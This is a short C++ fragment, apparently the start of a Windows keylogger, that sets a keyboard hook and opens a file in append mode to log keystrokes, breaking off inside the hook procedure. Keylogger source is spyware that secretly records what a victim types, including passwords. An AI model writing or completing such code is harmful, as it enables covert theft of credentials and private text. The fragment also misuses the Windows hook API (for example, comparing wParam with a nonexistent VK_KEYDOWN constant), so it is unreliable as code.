HHOOK hook = 0;
ofstream file(FILE_NAME, ios::app);

void KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        // Key pressed
        DWORD key = wParam;
        bool shift = (lParam & 0x20) ? true : false; // Check if shift is pressed
        if (key > 0) {
